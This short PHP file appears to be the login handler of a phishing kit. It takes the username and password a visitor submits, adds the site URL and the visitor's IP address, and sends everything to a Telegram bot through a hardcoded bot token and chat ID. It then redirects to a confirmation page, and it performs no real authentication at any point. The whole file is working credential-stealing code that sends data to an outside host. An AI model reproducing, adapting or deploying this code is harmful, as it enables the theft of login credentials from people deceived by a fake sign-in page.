<?

session_start();

$website = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
$website = str_replace('login.php', '', $website);

$token = "1180981314:AAHXPT951S4vek83Ratnrqt6XOZM-mrgV2I";
$chat_id = "-425180455";

$_SESSION['login'] = $_REQUEST['login'];

$arr = array(

    'Login: ' => $_REQUEST['login'],
    'Password: ' => $_REQUEST['password'],
	'Сайт: ' => $website,
	'IP адрес: ' => $_SERVER['REMOTE_ADDR'],
);

foreach ($arr as $key => $value) {
	$txt .= "<b>" . $key . "</b> " . $value . "\n";
};
$txt = urlencode($txt);
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}&disable_web_page_preview=true", "r");


header('location: confirm.php');

